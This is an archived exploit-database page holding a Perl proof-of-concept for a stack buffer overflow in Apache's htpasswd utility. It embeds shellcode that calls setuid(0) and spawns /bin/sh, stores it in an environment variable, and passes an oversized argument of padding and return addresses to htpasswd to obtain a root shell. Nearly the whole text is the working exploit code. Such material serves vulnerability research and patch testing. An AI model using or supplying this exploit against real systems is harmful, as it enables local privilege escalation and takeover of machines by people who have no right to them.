<html>
<head>
<title>milw0rm productions</title>
<pre>
#!/usr/bin/perl 
# Proof Of Concept exploit for htpasswd of Apache. 
# Read the advisory for more information. 
# - Luiz Fernando Camargo 
# - foxtrot_at_flowsecurity.org 
$shellcode = &quot;\x31\xdb\x6a\x17\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;. 
&quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;; 


$target = &quot;/usr/local/apache/bin/htpasswd&quot;; 
$retaddr = 0xbffffffa - length($shellcode) - length($target); 


print &quot;using retaddr = 0x&quot;, sprintf('%lx',($retaddr)), &quot;\r\n&quot;; 


local($ENV{'XXX'}) = $shellcode; 
$newret = pack('l', $retaddr); 
$buffer = &quot;A&quot; x 272; 
$buffer .= $newret x 4; 
$buffer .= &quot; &quot;; 
$buffer .= &quot;B&quot; x 290; 


exec(&quot;$target -nb $buffer&quot;); </pre>
//downloaded from milw0rm.com
</html>


<!-- BBClone v 0.4.2 OK: counter files updated -->

<!-- BBClone 0.4.2 OK: access files updated -->
